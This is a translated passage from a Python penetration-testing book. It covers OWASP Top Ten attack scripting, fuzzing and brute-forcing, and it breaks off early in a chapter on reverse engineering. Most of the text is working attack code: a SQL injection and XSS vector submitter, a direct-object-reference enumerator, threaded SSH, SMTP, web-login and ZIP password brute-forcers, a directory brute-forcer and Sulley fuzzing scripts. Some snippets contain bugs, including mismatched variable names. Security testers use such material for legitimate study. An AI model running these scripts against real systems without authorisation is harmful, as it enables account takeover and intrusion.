# Python 高效渗透测试（二）

> 原文：[`annas-archive.org/md5/DB873CDD9AEEB99C3C974BBEDB35BB24`](https://annas-archive.org/md5/DB873CDD9AEEB99C3C974BBEDB35BB24)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：使用 Python 进行攻击脚本编写

**开放式 Web 应用安全项目**（**OWASP**）十大是对最严重的网络应用安全风险的列表。在本章中，我们将讨论如何使用 Python 库编写 OWASP 十大攻击脚本：

+   注入

+   破坏的身份验证

+   跨站脚本（XSS）

+   不安全的直接对象引用

+   安全配置错误

+   敏感数据暴露

+   缺少功能级访问控制

+   CSRF 攻击

+   使用已知漏洞的组件

+   未经验证的重定向和转发

# 注入

SQL 注入是攻击者可能创建或更改 SQL 命令以披露数据库中的数据的方法。这对于接受用户输入并将其与静态参数结合以构建 SQL 查询而没有适当验证的应用程序非常有效。

同样，所有类型的注入攻击都可以通过操纵应用程序的输入数据来完成。使用 Python，我们可以向应用程序注入一些攻击向量，并分析输出以验证攻击的可能性。Mechanize 是一个非常有用的 Python 模块，用于浏览网页表单，它提供了一个具有状态的编程式网络浏览体验。

我们可以使用`mechanize`来提交表单并分析响应：

```py
import mechanize 
 # Import module 

# Set the URL 
url = "http://www.webscantest.com/datastore/search_by_id.php" 

request = mechanize.Browser() 

request.open(url) 

# Selected the first form in the page 
request.select_form(nr=0) 

# Set the Id  
request["id"] = "1 OR 1=1" 

# Submit the form 
response = request.submit() 

content = response.read() 

print content 

```

这将打印出 POST 请求的响应。在这里，我们提交一个攻击向量来破坏 SQL 查询，并打印表中所有数据而不是一行。在测试网站时，我们必须创建许多类似的自定义脚本来测试许多类似的攻击向量。

因此，让我们重写脚本，从文件中获取所有攻击向量，然后逐个发送到服务器，并将输出保存到文件中：

```py
import mechanize 

# Set the URL 
url = "http://www.webscantest.com/datastore/search_by_id.php" 

browser = mechanize.Browser() 

attackNumber = 1 

# Read attack vectors 
with open('attack-vector.txt') as f: 

    # Send request with each attack vector 
    for line in f: 

         browser.open(url) 

   browser.select_form(nr=0) 

         browser["id"] = line 

         res = browser.submit() 

   content = res.read() 

      # write the response to file 
   output = open('response/'+str(attackNumber)+'.txt', 'w') 

   output.write(content) 

   output.close() 

   print attackNumber 

   attackNumber += 1 

```

我们可以检查请求的响应并识别可能的攻击。例如，前面的代码示例将提供包含句子“您的 SQL 语法有错误”的响应。从中，我们可以确定这种形式可能容易受到 SQL 注入攻击。之后，我们可以排除包含错误的响应，因为它们不会包含所需的数据。

此外，我们可以编写自定义脚本来注入 LDAP、XPath 或 NoSQL 查询、操作系统命令、XML 解析器和所有其他注入向量。

# 破坏的身份验证

当用于对应用程序进行用户身份验证的身份验证功能实施不正确时，可能会允许黑客破解密码或会话 ID，或利用其他用户的凭据来利用其他实施缺陷。这些类型的缺陷被称为破坏的身份验证。

我们可以使用机械化脚本来检查应用程序中的身份验证机制。

因此，我们必须检查账户管理功能，如账户创建、更改密码和找回密码。我们还可以编写定制的暴力和字典攻击脚本，以检查应用程序的登录机制。

我们可以生成包含一系列字符的所有可能密码，如下所示：

```py
# import required modules
from itertools import combinations  

from string import ascii_lowercase 

# Possible password list 

passwords = (p for p in combinations(ascii_lowercase,8)) 

for p in passwords: 

    print ''.join(p) 

```

稍后，我们可以使用这些密码进行暴力攻击，方法如下：

```py
import mechanize 

from itertools import combinations  

from string import ascii_lowercase 

url = "http://www.webscantest.com/login.php" 

browser = mechanize.Browser() 

attackNumber = 1 

# Possible password list 

passwords = (p for p in combinations(ascii_lowercase,8)) 

for p in passwords: 

    browser.open(url) 

    browser.select_form(nr=0) 

    browser["login"] = 'testuser' 

    browser["passwd"] = ''.join(p) 

    res = browser.submit() 

    content = res.read() 

    # Print  response code 

    print res.code 

     # Write response to file 

    output = open('response/'+str(attackNumber)+'.txt', 'w') 

    output.write(content) 

    output.close() 

    attackNumber += 1 

```

在这里，我们可以分析响应并确认登录。为此，我们必须搜索错误消息的响应。如果在响应中找不到错误消息，那么登录将成功。

在上面的例子中，我们可以检查是否被带回登录页面。如果我们被带回登录页面，登录失败：

```py
    # check if we were taken back to the login page or not 

    if content.find('<input type="password" name="passwd" />') > 0: 

         print "Login failed" 

```

我们还可以修改此脚本以暴力破解可预测或不太随机的会话 cookie。为此，我们必须分析身份验证 cookie 的模式。我们还可以用字典中的单词替换密码。代码将与我们为注入所做的相同，攻击向量将被字典文件中提供的单词替换。

# 跨站脚本（XSS）

跨站脚本也是一种注入攻击类型，当攻击者注入恶意攻击向量以浏览器端脚本的形式时发生。这是在 Web 应用程序使用用户的输入来构建输出而不进行验证或编码时发生的。

我们可以修改用于注入 SQL 攻击向量的脚本以测试 XSS 注入。为了验证输出响应，我们可以在响应中搜索预期的脚本：

```py
import mechanize 

url = "http://www.webscantest.com/crosstraining/aboutyou.php" 

browser = mechanize.Browser() 

attackNumber = 1 

with open('XSS-vectors.txt') as f: 

    for line in f: 

         browser.open(url) 

         browser.select_form(nr=0) 

         browser["fname"] = line 

         res = browser.submit() 

         content = res.read() 

         # check the attack vector is printed in the response. 
         if content.find(line) > 0: 

               print "Possible XXS" 

   output = open('response/'+str(attackNumber)+'.txt', 'w') 

   output.write(content) 

   output.close() 

   print attackNumber 

   attackNumber += 1 

```

XSS 发生在用户输入未经验证地打印到响应中。因此，为了检查 XSS 攻击的可能性，我们可以检查响应文本中我们提供的攻击向量。如果攻击向量在响应中出现而没有任何转义或验证，那么就有很高的可能性发生 XSS 攻击。

# 不安全的直接对象引用

当应用程序使用实际的引用标识符（ID）、名称或键来创建网页或 URL 时，且应用程序不验证用户访问请求页面的真实性时，就会发生这种漏洞。攻击者可能会更改 URL 中的参数以检测此类漏洞。

在应用程序中，用户的数据对另一个用户是不可访问的。检查以下脚本示例；它将遍历用户并检查数据是否对已登录用户可见：

```py
import mechanize 

url = "http://www.webscantest.com/business/access.php?serviceid=" 

attackNumber = 1 

for i in range(5): 

    res = mechanize.urlopen(url+str(i)) 

    content = res.read() 

    #  check if the content is accessible 

    if content.find("You service") > 0: 

         print "Possible Direct Object Reference" 

    output = open('response/'+str(attackNumber)+'.txt', 'w') 

    output.write(content) 

    output.close() 

    print attackNumber 

    attackNumber += 1 

```

# 安全配置错误

为了更安全的应用程序，需要对其所有基础技术进行安全配置，如应用程序、Web 服务器、数据库服务器和操作系统。此外，我们需要保持所有软件保持最新。一些安全配置错误的示例如下：

+   过时的软件

+   服务器中存在示例应用程序或示例数据库

+   启用导致数据泄露的目录列表，包括代码库

+   未处理的错误页面，可能会泄露敏感信息

+   适用或适用框架中的默认密码

+   我们可以使用 Python 脚本来验证这些类型的漏洞。正如我们在前面的章节中讨论的那样，我们可以使用 Python 库发送精心制作的请求并分析它们的响应。

# 敏感数据暴露

我们可以编写定制的 Python 脚本来检查网页中可能的数据暴露。例如，我们在上一章中讨论了电子邮件收集脚本，也可以用来检查网页中是否有任何暴露的电子邮件 ID。

为此，我们必须编写一个脚本来检查我们正在寻找的模式的 HTTP 响应。敏感数据可能会根据网站及其用途而有所不同。但我们可以检查敏感信息的暴露，如信用卡、银行详细信息、个人身份识别号码等。

# 缺少功能级访问控制

Web 应用程序在向用户提供特定功能的访问权限之前会验证用户的功能级访问权限。这些访问控制检查也需要在服务器端进行验证。如果服务器端缺少这些类型的访问检查，攻击者可以在没有任何授权的情况下进入应用程序。为了检查这种类型的漏洞，我们可以创建自定义脚本来验证应用程序的低权限用户，并尝试访问受限页面。我们可以确保所有受限页面对于任何低权限用户都是不可访问的。

# CSRF 攻击

**跨站请求伪造**（**CSRF**）攻击欺骗受害者的浏览器在受害者登录时向易受攻击的应用程序发送操纵的请求。因此，应用程序应确保请求是合法的。

由于 CSRF 攻击是针对已登录用户的攻击，我们必须在请求中发送会话 cookie。我们可以使用`cookielib`在会话之间记住 cookie：

```py
import mechanize 

cookies = mechanize.CookieJar() 

cookie_opener = mechanize.build_opener(mechanize.HTTPCookieProcessor(cookies)) 
mechanize.install_opener(cookie_opener)  

url = "http://www.webscantest.com/crosstraining/aboutyou.php" 

res = mechanize.urlopen(url) 

content = res.read()    

```

要测试 CSRF，我们必须从实际页面以外的页面提交表单。我们还可以检查 CSRF 令牌。如果表单中存在这样的令牌，操纵值并确保表单在错误的 CSRF 令牌下失败，并在每个请求上生成一个新的令牌。

# 使用已知漏洞的组件

当我们在应用程序中使用类似库、框架等组件时，如果没有进行适当的验证，就会出现这种类型的漏洞。这些组件可能始终在应用程序中以完全特权执行。因此，当应用程序中使用了一个有漏洞的组件时，这会让攻击者的工作变得更容易。我们可以编写一个 Python 脚本来检查应用程序中使用的组件的版本，并与**开放源漏洞数据库**（**OSVDB**）进行验证，查看是否存在未修补的已知漏洞。

OSVDB 列出了几乎所有已知的库和框架漏洞。因此，我们必须确保我们使用的是最新的组件，并且已经应用了最新的补丁。

# 未经验证的重定向和转发

Web 应用程序经常将用户重定向到其他页面或外部网站。我们必须验证这些重定向页面和网站的可信度。如果重定向目标作为应用程序的参数传递，攻击者可以将用户引导到任何钓鱼或注入恶意软件的网页。我们可以编写一个 Python 脚本来验证应用程序中的所有外部链接。为了验证可信度，我们可以依赖于像 Google 安全浏览检查器或 McAfee 网站顾问这样的第三方服务。

### 提示

Google 安全浏览检查器可以在这里找到：[`www.google.com/transparencyreport/safebrowsing/diagnostic/index.html`](https://www.google.com/transparencyreport/safebrowsing/diagnostic/index.html)，而 McAfee 网站顾问可以在这里找到：[`www.siteadvisor.com/sites/`](http://www.siteadvisor.com/sites/)。

# 总结

我们已经讨论了攻击脚本的基本可能性。现在你可以根据自己的需求创建自定义脚本。在本章中，我们使用了 mechanize 进行脚本编写。我们也可以使用前几章讨论过的任何其他模块来满足需求。在下一章中，我们将更多地讨论模糊测试和暴力攻击。


# 第五章：模糊和暴力破解

安全测试人员最有用的工具之一是模糊测试工具，用于测试应用程序的参数。模糊测试在发现安全漏洞方面非常有效，因为它可以通过扫描应用程序的攻击面来发现弱点。模糊生成器可以测试应用程序的目录遍历、命令执行、SQL 注入和跨站脚本漏洞。

最好的模糊生成器是高度可定制的，因此在本章中，我们将学习如何构建可以用于特定应用程序的自己的模糊生成器。

本章涵盖的主题如下：

+   模糊和暴力破解密码

+   SSH 暴力破解

+   SMTP 暴力破解

+   暴力破解目录和文件位置

+   暴力破解密码保护的 zip 文件

+   Sulley 模糊框架

# 模糊化

一般来说，模糊化过程包括以下阶段：

+   **识别目标**：对于模糊化应用程序，我们必须确定目标应用程序。例如，具有特定 IP 并在端口 21 上运行的 FTP 服务器。

+   **识别输入**：正如我们所知，漏洞存在是因为目标应用程序接受了格式不正确的输入并在未经过消毒的情况下进行处理。因此，我们必须确定应用程序接受的输入。例如，在 FTP 服务器中，用户名和密码是输入。

+   **创建模糊数据**：在获取所有输入参数后，我们必须创建无效的输入数据发送到目标应用程序。模糊数据通常被称为有效载荷。

+   **模糊化**：创建模糊数据后，我们必须将其发送到目标应用程序。

+   **监视异常和日志记录**：现在我们必须观察目标应用程序的有趣响应和崩溃，并保存这些数据以进行手动分析。监视 Web 应用程序的模糊测试有点不同，因为模糊测试可能不会使目标应用程序崩溃。我们必须依赖错误消息和响应；确保记下任何此类意外响应以进行手动分析。有时应用程序可能会在错误消息中透露内部构建块。

+   **确定可利用性**：模糊化后，我们必须检查有趣的响应或导致崩溃的输入。这可能有助于利用目标应用程序。并非所有崩溃都会导致可利用的漏洞。

# 模糊生成器的分类

基于目标、使用的攻击向量和模糊化方法，存在许多模糊化的分类。模糊化目标包括文件格式、网络协议、命令行参数、环境变量、Web 应用程序等。模糊化可以根据生成测试用例的方式进行广泛分类。它们是突变模糊化（转储）和生成模糊化（智能）。

## 突变（转储）模糊生成器

创建完全随机输入的模糊生成器称为突变或转储模糊生成器。这种类型的模糊生成器盲目地突变现有的输入值。但它缺乏可理解的数据格式或结构。例如，它可以替换或附加随机数据片段到所需的输入。

## 智能模糊生成器

生成模糊生成器从头开始创建输入，而不是突变现有输入。因此，它需要一定程度的智能，以生成对目标应用程序至少有些意义的输入。

与突变模糊生成器相比，这种类型将了解文件格式、协议等。此外，这种类型的模糊生成器难以创建，但更有效。

# 模糊和暴力破解密码

密码可以通过猜测或尝试使用每种可能的单词和字母组合来破解。如果密码很复杂，包括数字、字符和特殊字符的组合，可能需要几小时、几周或几个月。

# 字典攻击

从可能被用作密码的单词开始，测试所有可能的密码。这种方法与我们对注入所做的方法相同。

我们可以从字典文件中读取密码并在应用程序中尝试：

```py
with open('password-dictionary.txt') as f: 
    for password in f: 
        try: 
                # Use the password to try login 

                print "[+] Password Found: %s" % password 
                break; 
        except : 
                print "[!] Password Incorrect: %s" % password 

```

在这里，我们读取`字典`文件并在我们的脚本中尝试每个密码。当特定密码有效时，它将在控制台中打印出来。

### 提示

您可以在这里下载整个模糊数据库列表：[`github.com/fuzzdb-project/fuzzdb`](https://github.com/fuzzdb-project/fuzzdb)。

# SSH 暴力破解

我们可以使用 Python 脚本来自动化暴力破解攻击以破解 SSH 登录。在这里，我们尝试多个用户名和密码以绕过 SSH 身份验证，使用自动化的 Python 脚本。对于 SSH 的暴力破解，我们必须使用一个名为**paramiko**的模块，它让我们连接到 SSH。

首先，我们导入所需的模块：

```py
import paramiko, sys, os, socket  
import itertools,string,crypt  

```

然后我们初始化静态变量，如密码大小、目标 IP、目标端口和用户：

```py
PASS_SIZE = 5 
IP = "127.0.0.1" 
USER = "root" 
PORT=22 

var = itertools.combinations(string.digits,PASS_SIZE) 

```

检查每个密码：

```py
try: 
    for i in var: 
        passwd = ''.join(i) 

        ssh_client = paramiko.SSHClient() 
        ssh_client.load_system_host_keys() 
           ssh_clienth.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) 
        try: 
            ssh.connect(IP , port=PORT, username=USER, password=passwd) 
            print "Password Found= "+passwd 
            break 
        except paramiko.AuthenticationException, error: 
            print "Faild Attempt: "+passwd 
            continue 
        except socket.error, error: 
            print error 
            continue 
        except paramiko.SSHException, error: 
            print error 
            continue 
        except Exception, error: 
            print "Unknown error: "+error 
            continue     
        ssh.close() 

except Exception,error : 
    print error  

```

我们可以使用线程模块使此脚本多线程化：

```py
import paramiko, sys, os, socket, threading, time  
import itertools,string,crypt 

PASS_SIZE = 5 

def bruteforce_list(charset, maxlength): 
    return (''.join(candidate) 
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i) 
        for i in range(1, maxlength + 1))) 

def attempt(Password): 

    IP = "127.0.0.1" 
    USER = "rejah" 
    PORT=22 

    try: 

        ssh = paramiko.SSHClient() 
        ssh.load_system_host_keys() 
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) 

        try: 
            ssh.connect(IP , port=PORT, username=USER, password=Password) 
            print "Connected successfully. Password = "+Password 
        except paramiko.AuthenticationException, error: 
            print "Incorrect password: "+Password 
            pass 
        except socket.error, error: 
            print error 
            pass 
        except paramiko.SSHException, error: 
            print error 
            print "Most probably this is caused by a missing host key" 
            pass 
        except Exception, error: 
            print "Unknown error: "+error 
            pass     
        ssh.close() 

    except Exception,error : 
        print error 

letters_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQSTUVWXYZ1234567890!@#$&()'  

```

在这里，我们使用线程来使模糊测试并行运行，以提高速度：

```py
for i in bruteforce_list(letters_list, PASS_SIZE): 
    t = threading.Thread(target=attempt, args=(i)) 
    t.start() 
    time.sleep(0.3) 

sys.exit(0) 

```

# SMTP 暴力破解

**简单邮件传输协议**（**SMTP**）是网络上的电子邮件传输标准。电子邮件服务器和其他邮件传输代理使用 SMTP 来发送和接收电子邮件。电子邮件客户端应用程序通常仅使用 SMTP 发送电子邮件。要对 SMTP 进行暴力破解密码审计，我们可以使用`smptlib`模块，它可以帮助我们连接到 SMTP。

像往常一样，导入所需的模块：

```py
import sys, smtplib, socket 
from smtplib import SMTP 

```

设置`IP`和`USER`。您也可以将这些值作为输入参数获取：

```py
IP = "127.0.0.1" 
USER = "admin"  

```

检查 SMTP 中的每个密码列表中的密码：

```py
attackNumber = 1 
with open('passwordlist.txt') as f: 
    for PASSWORD in f: 
         try: 
               print "-"*12 
               print "User:",USER,"Password:",PASSWORD 
               smtp = smtplib.SMTP(IP) 
               smtp.login(user, value) 
               print "\t\nLogin successful:",user, value 
               smtp.quit() 
               work.join() 
               sys.exit(2) 
         except(socket.gaierror, socket.error, socket.herror,
         smtplib.SMTPException), msg:  
               print "An error occurred:", msg 

```

# 暴力破解目录和文件位置

我们可以编写一个自定义的蜘蛛脚本来爬取目标网站，以发现有关 Web 应用程序的足够信息。然而，通常会有很多配置文件、剩余的开发文件、备份文件、调试脚本和许多其他文件，这些文件可以提供有关 Web 应用程序的敏感信息，或者公开一些开发人员没有打算公开的功能。

发现这种类型的内容的方法是使用暴力破解来追踪常见的文件名和目录。拥有我们自己的自定义脚本总是更好的，这将帮助我们自定义目标文件并根据我们的要求过滤结果。

首先，像往常一样，我们导入所需的模块。这里我们使用线程来并行运行多个请求。但是请确保保持线程数量较低；大量的线程可能会导致拒绝服务：

```py
import urllib 
import urllib2 
import threading 
import Queue 

threads           = 50     # Be aware that a large number of threads can cause a denial of service!!! 
target_url        = "http://www.example.com" 
wordlist_file     = "directory-list.txt"  
user_agent        = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0" 

```

现在我们定义一个函数来读取单词列表文件并形成一个用于暴力破解的单词数组：

```py
def wordlist(wordlist_file): 

    wordlist_file = open(wordlist_file,"rb") 
    raw_words = wordlist_file.readlines() 
    wordlist_file.close() 

    words        = Queue.Queue() 

    # iterating each word in the word file 
    for word in raw_words:       

        word = word.rstrip() 
        words.put(word) 

    return words  

```

接下来，我们将定义一个函数，用于使用单词列表中单词的可能扩展名来暴力破解 URL，检查文件扩展名的单词，如果不是文件，则添加额外的斜杠（`/`），并为每个单词创建一个可能扩展名和目录斜杠的尝试列表。创建尝试列表后，检查附加到提供的 URL 的尝试列表中的每个条目：

```py
def dir_bruteforce(extensions=None): 

    while not word_queue.empty(): 
        attempt = word_queue.get() 

        attempt_list = [] 

        # check for a file extension, if not it's a directory 
        if "." not in attempt: 
            attempt_list.append("/%s/" % attempt) 
        else: 
            attempt_list.append("/%s" % attempt) 

        # if we want to bruteforce extensions 
        if extensions: 
            for extension in extensions: 
                attempt_list.append("/%s%s" % (attempt,extension)) 

        # iterate with list of attempts         
        for brute in attempt_list: 

            url = "%s%s" % (target_url,urllib.quote(brute)) 

            try: 
                headers = {} 
                headers["User-Agent"] = user_agent 
                r = urllib2.Request(url,headers=headers) 

                response = urllib2.urlopen(r) 

                if len(response.read()): 
                    print "[%d] => %s" % (response.code,url) 

            except urllib2.HTTPError,e: 
               # print output If error code is not 404 
                if e.code != 404: 
                    print "!!! %d => %s" % (e.code,url) 

                pass 

word_queue = wordlist(wordlist_file) 
extensions = [".php",".bak",".orig",".inc"]  

```

然后我们以线程模式启动暴力破解：

```py
for i in range(threads): 
            t = threading.Thread(target=dir_bruteforce,args=(extensions,)) 
            t.start() 

```

# 暴力破解密码保护的 ZIP 文件

正如我们讨论的，可以使用相同的方法来破解受保护的 ZIP 文件中的密码。为此，我们使用`zipfile`模块：

```py
import zipfile 

filename = 'test.zip' 
dictionary = 'passwordlist.txt' 

password = None 
file_to_open = zipfile.ZipFile(filename) 
with open(dictionary, 'r') as f: 
   for line in f.readlines(): 
         password = line.strip('\n') 
         try: 
               file_to_open.extractall(pwd=password) 
               password = 'Password found: %s' % password 
               print password 
         except: 
               pass 

```

## Sulley 模糊测试框架

通过使用模糊测试框架，我们可以更快地创建模糊器。模糊测试框架提供了一个灵活和可重用的开发环境，有助于快速构建模糊器。

Sulley 是一个 Python 模糊测试框架，由多个可扩展组件组成，可用于模糊文件格式、网络协议、命令行参数等。Sulley 可以监视网络并系统地记录。它还可以监视目标的健康状况。

### 安装

Sulley 依赖于 PaiMei 和 pcapy。PaiMei 是一个逆向工程框架，用于调试模糊应用程序和`pcap`捕获数据包。

PaiMei 有很多依赖项，如提供 Python 数据库 API 的 MySQL 数据库服务器，wxPython，GraphViz，Oreas GDE，uDraw，pydot 和 ctypes。因此，我们必须首先安装这些依赖项。

在 Debian Linux 中，我们可以从`apt-get`存储库安装 pydot，ctypes，wxPython 和 GraphViz：

```py
$ apt-get instal
l python-ctypeslib python-pydot python-wxgtk2.8 python-mysqldb python-pygraphviz

```

然后我们可以从[`www.openrce.org/downloads/details/208`](http://www.openrce.org/downloads/details/208)下载 PaiMei。

解压缩 zip 文件后，运行`_install_requirements.py`文件以安装其要求。之后，如果主机机器上没有安装 MySql 服务器，则安装 MySql 服务器：

```py
 $ apt-get install mysql-server

```

然后，使用`__setup_mysql.py`文件配置 MySQL 服务器。为此，请使用以下 Python 脚本运行您的 MySQL 服务器凭据作为参数：

```py
 $ python __setup_mysql.py hostname username password

```

然后通过运行设置脚本来安装 PaiMei，就像我们为其他 Python 模块所做的那样：

```py
$ python setup.py build
$ python setup.py install

```

我们还需要安装`pcapy`库。要安装`pcapy`库，我们可以依赖于`apt-get`存储库：

```py
 $ apt-get install python-pcapy python-impacket

```

现在我们已经安装了所有的先决条件。因此，我们可以克隆`sulley`库并使用它：

```py
 $ git clone https://github.com/OpenRCE/sulley.git

```

然后进入`sulley`文件夹：

```py
 $ cd sulley

```

要验证安装，请使用 Python 运行`process_monitor.py`脚本和`network_monitor.py`：

```py
$ sudo python process_monitor.py

```

输出如下：

![安装](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_05_001.jpg)

```py
$ python network_monitor.py

```

输出如下：

![安装](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_05_002.jpg)

要在 Windows 上安装，就像在 Linux 上一样，首先安装先决条件。

要安装 PaiMei，请像在 Linux 上那样从链接下载并运行`__install_requirements.py`：

```py
 $ python __install_requirements.py

```

这将安装 PaiMei 的依赖项（ctypes，pydot，wxPython，MySQLdb，Graphviz，Oreas GDE 和 uDraw）。

然后，运行 MySQL 设置`script.python __setup_mysql.py`主机名用户名密码。

之后，通过运行构建和安装命令来安装 PaiMei 库：

```py
$ python setup.py build
$ python setup.py install

```

然后我们需要下载并安装`libdasm`。从[`libdasm.googlecode.com/files/libdasm-beta.zip`](http://libdasm.googlecode.com/files/libdasm-beta.zip)下载并运行设置。

然后，从`pip`安装`pcapy`：

```py
 $ pip install pcapy

```

现在，克隆`sulley`库：

```py
 $ git clone https://github.com/OpenRCE/sulley.git

```

我们可以通过运行`process_monitor_unix.py`和`network_monitor.py`来检查安装。

### 提示

安装有任何问题吗？这是 Windows 的详细安装说明：[`github.com/OpenRCE/sulley/wiki/Windows-Installation`](https://github.com/OpenRCE/sulley/wiki/Windows-Installation)。

### 使用 sulley 进行脚本编写

在我们开始使用 sulley 编写模糊脚本之前，我们需要对将在 sulley 中使用的语法有基本的了解。当我们编写一个使用 sulley 模糊特定目标的 Python 脚本时，我们需要定义所有必需的对象。所有 sulley 命令都以`s_`前缀开头。以下是将用于构建脚本的几个部分：

+   **数据模型**：定义我们将要模糊的协议的属性。

+   **状态模型**：定义模糊网络协议不同状态之间的可能交互。例如，经过身份验证和未经身份验证的状态。

+   **目标**：定义要模糊的目标。例如，服务器的 IP 和端口。

+   **代理**：监视模糊进程崩溃，拦截相关网络数据包，重新启动崩溃的进程等的程序。这在目标计算机上运行。

+   **监视界面**：帮助查看模糊处理的结果。

### 基元

要创建一个静态的不可变值，我们可以使用`s_static()`。

要创建一个四字节的单词，我们可以使用`s_int()`。例如，创建以`555`开头并以 ASCII 格式化的变异整数：

```py
s_int("555", format="ascii", fuzzable=True) 

```

### 块和组

原语可以嵌套在块内。这样的块可以以`s_block_start()`开始，并以`s_block_end()`结束。一个组是原语的集合；我们可以用`s_group()`开始一个组。一个静态组原语的示例列出了各种 HTTP 方法如下：

```py
s_group("methods", values=["GET", "HEAD", "POST", "TRACE"])   

```

分组允许我们将块附加到组原语上，以指定该块应循环遍历所有可能的方式。我们可以通过块迭代这些静态 HTTP 方法如下。这定义了一个名为`"body"`的新块，并将其与前面的组关联起来：

```py
if s_block_start(“body”, group=”method”)
 s_delim("/")
 s_string("index.html")
 s_delim(" ")
s_block_end()

```

### 会话

我们可以将多个请求绑定在一起形成一个会话。Sulley 能够通过在图中将请求链接在一起来模糊*深入*协议。Sulley 通过图结构，从根节点开始，沿途模糊每个组件。

现在我们可以编写一个脚本来模糊测试 SSH 连接。

首先，导入模块`sulley`和`paramiko`。确保脚本位于我们从 GitHub 下载的 sulley 程序的根目录中：

```py
from sulley import * 
import sulley.primitives 
import paramiko 

```

然后，将用户名和密码设置为字符串原语。Sulley 提供`s_string()`原语来表示这些字段，以表示其中包含的数据是可模糊的字符串。字符串可以是任何东西，如电子邮件地址、主机名、用户名、密码等等。

```py
user = primitives.string("user") 
pwd = primitives.string("password") 

```

然后，初始化 paramiko SSH 客户端以尝试连接到 SSH：

```py
client = paramiko.SSHClient() 
client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 

```

接下来我们可以开始模糊测试：

```py
while(user.mutate() and pwd.mutate()): 
   username = user.value 
   password = pwd.value 
   try: 
         # Try to connect to the server with the mutated credentials 
         client.connect("192.168.1.107", 22, username, password, timeout=5) 
         client.close() 
   except Exception,e: 
         print "error! %s" % e 

```

这将尝试变异用户名和密码，并尝试使用 paramiko 连接到服务器。

同样，我们可以对 FTP 协议进行模糊测试。在这里，我们从 requests 和 sulley 导入 FTP：

```py
from sulley import * 
from requests import ftp 

```

现在，我们指示 sulley 在开始模糊测试之前等待横幅：

```py
def recv_banner(sock): 
   sock.recv(1024) 

```

然后，我们初始化会话，这样可以跟踪我们的模糊测试。这使我们能够在先前离开的地方停止和重新开始模糊测试：

```py
sess = sessions.session("ftp_test.session") 

```

现在我们可以使用目标 FTP 服务器的 IP 和端口号来定义我们的目标：

```py
target = sessions.target("192.168.1.107",21) 

```

然后，我们可以指示网络嗅探器在同一主机上设置自己，并监听`26300`：

```py
target.netmon = pedrpc.client("192.168.1.107",26300)  

```

现在，设置目标并获取 FTP 横幅：

```py
sess.add_target(target) 
sess.pre_send(recv_banner) 

```

尝试认证 FTP 连接：

```py
sess.connect(s_get("user")) 
sess.connect(s_get("user"),s_get("pass")) 

```

认证后，我们可以使用需要认证的命令，如下所示：

```py
sess.connect(s_get("pass"),s_get("cwd")) 
sess.connect(s_get("pass"),s_get("mkd")) 
sess.connect(s_get("pass"),s_get("rmd")) 
sess.connect(s_get("pass"),s_get("list")) 
sess.connect(s_get("pass"),s_get("delete")) 
sess.connect(s_get("pass"),s_get("port"))  

```

最后，指示 sulley 开始`fuzz`：

```py
sess.fuzz()  

```

### 提示

您可以在这里了解更多关于 sulley 及其用法：[`www.fuzzing.org/wp-content/SulleyManual.pdf`](http://www.fuzzing.org/wp-content/SulleyManual.pdf)。

# 总结

我们已经了解了模糊测试和密码暴力破解的基本方法。现在我们可以扩展脚本以满足我们自己的需求。有许多模糊测试和暴力破解工具可用，但自定义脚本总是更好以获得我们特定的结果。我们将在下一章中更多地讨论使用 Python 库进行调试和逆向工程。


# 第六章：调试和逆向工程

调试器是逆向工程中使用的主要工具。使用调试器，我们可以在运行时执行分析以了解程序。我们可以识别调用链并跟踪间接调用。使用调试器，我们可以分析和监视程序运行时，以指导我们的逆向工程。在本章中，我们将学习如何在脚本中使用调试器。

本章涵盖的主题如下：

+   可移植可执行文件分析

+   使用 Capstone 进行反汇编

+   带有 Capstone 的 PE 文件

+   使用 PyDBG 进行调试

# 逆向工程

逆向工程分析主要有三种类型：

+   **静态分析**：分析二进制文件的内容。这有助于确定可执行部分的结构，并打印出可读部分，以获取有关可执行文件目的的更多细节。

+   **动态分析**：这种类型将执行二进制文件，无论是否附加调试器，以发现其目的和可执行文件的工作方式。

+   **混合分析**：这是静态和动态分析的混合。在静态分析之间重复，然后进行动态调试，将更好地了解程序。

# 可移植可执行文件分析

任何 UNIX 或 Windows 二进制可执行文件都将具有描述其结构的头部。这包括其代码的基地址、数据部分和可以从可执行文件中导出的函数列表。当操作系统执行可执行文件时，首先操作系统读取其头部信息，然后加载二进制数据从二进制文件中以填充相应进程的代码和数据部分的地址内容。

**可移植可执行文件**（**PE**）文件是 Windows 操作系统可以执行或运行的文件类型。我们在 Windows 系统上运行的文件是 Windows PE 文件；这些文件可以具有 EXE、DLL（动态链接库）和 SYS（设备驱动程序）扩展名。此外，它们包含 PE 文件格式。

Windows 上的二进制可执行文件具有以下结构：

+   DOS 头部（64 字节）

+   PE 头部

+   部分（代码和数据）

我们现在将详细研究每一种。

## DOS 头部

DOS 头部以魔术数字`4D 5A 50 00`开头（前两个字节是字母`MZ`），最后四个字节（`e_lfanew`）指示二进制可执行文件中 PE 头部的位置。所有其他字段都不相关。

## PE 头部

PE 头部包含更多有趣的信息。以下是 PE 头部的结构：

![PE 头部](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/eff-py-pentest/img/image_06_001-2.jpg)

PE 头部由三部分组成：

+   4 字节的魔术代码

+   20 字节的文件头，其数据类型为**IMAGE_FILE_HEADER**

+   224 字节的可选头，其数据类型为**IMAGE_OPTIONAL_HEADER32**

此外，可选头部有两部分。前 96 字节包含诸如主要操作系统和入口点之类的信息。第二部分由 16 个条目组成，每个条目有 8 个字节，形成 128 字节的数据目录。

### 注意

